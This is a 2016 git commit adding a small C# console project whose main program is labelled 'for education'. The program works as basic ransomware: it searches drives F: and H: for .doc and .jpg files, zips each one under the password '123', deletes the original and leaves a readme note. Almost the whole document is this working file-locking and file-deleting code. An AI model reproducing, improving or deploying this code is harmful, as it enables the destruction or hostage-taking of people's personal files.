0ec55b54482055afc0b3e775d42cfdc7497e4414
Desktop <Desktop@DESKTOP-K3JI2A5>
2016-07-22 19:54:43 +0300

    Добавьте файлы проекта.

---
+++ app1/Program.cs
@@ -0,0 +1,99 @@
+﻿/* 
+╔════╦═══╦══╦══╗╔═══╦╗─╔╦════╗
+╚═╗╔═╣╔═╗╠╗╔╣╔╗╚╣╔══╣╚═╝╠═╗╔═╝
+──║║─║╚═╝║║║║║╚╗║╚══╣╔╗─║─║║
+──║║─║╔╗╔╝║║║║─║║╔══╣║╚╗║─║║
+──║║─║║║║╔╝╚╣╚═╝║╚══╣║─║║─║║
+──╚╝─╚╝╚╝╚══╩═══╩═══╩╝─╚╝─╚╝
+Created by madD3SiR3 for education
+*/
+
+
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using Ionic.Zip;
+
+namespace ConsoleApplication8
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            
+            string[] drives = { "F:", "H:" }; // Drives
+            foreach (string drv in drives)
+
+            {
+                IEnumerable<string> MyFiles = SafeEnumerateFiles(drv, new[] { "*.doc", "*.jpg" }, SearchOption.AllDirectories); // Extensions
+                foreach (string fileName in MyFiles)
+                    using (ZipFile p = new ZipFile())
+                    {
+                        p.CompressionLevel = Ionic.Zlib.CompressionLevel.None; // Сompression level 
+                        p.Password = "123"; // Password
+                        p.AddFile(fileName,""); // Add file
+                        p.Save(fileName + " locked" + ".zip"); // Save file
+
+                        File.Delete(fileName);
+                        File.WriteAllText(Path.GetDirectoryName(fileName) + "/" + "readme.txt", "info"); // File info
+                    }
+            }
+            
+        }
+        private static IEnumerable<string> SafeEnumerateFiles(string path, string[] searchPatterns, SearchOption searchOption)
+        {
+            Stack<string> dirs = new Stack<string>();
+            dirs.Push(path);
+
+            while (dirs.Count > 0)
+            {
+                string currentDirPath = dirs.Pop();
+                if (searchOption == SearchOption.AllDirectories)
+                {
+                    try
+                    {
+                        string[] subDirs = Directory.GetDirectories(currentDirPath);
+                        foreach (string subDirPath in subDirs)
+                        {
+                            dirs.Push(subDirPath);
+                        }
+                    }
+                    catch (UnauthorizedAccessException)
+                    {
+                        continue;
+                    }
+                    catch (DirectoryNotFoundException)
+                    {
+                        continue;
+                    }
+                }
+
+                foreach (string searchPattern in searchPatterns)
+                {
+                    string[] files;
+                    try
+                    {
+                        files = Directory.GetFiles(currentDirPath, searchPattern);
+                    }
+                    catch (UnauthorizedAccessException)
+                    {
+                        break;
+                    }
+                    catch (DirectoryNotFoundException)
+                    {
+                        break;
+                    }
+                    foreach (string filePath in files)
+                    {
+                        yield return filePath;
+                    }
+                }
+            }
+        }
+
+    }
+}
+
---
+++ app1/Properties/AssemblyInfo.cs
@@ -0,0 +1,16 @@
+﻿using System.Reflection;
+using System.Runtime.InteropServices;
+
+[assembly: AssemblyTitle("app1")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("app1")]
+[assembly: AssemblyCopyright("Copyright ©  2016")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+[assembly: ComVisible(false)]
+
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
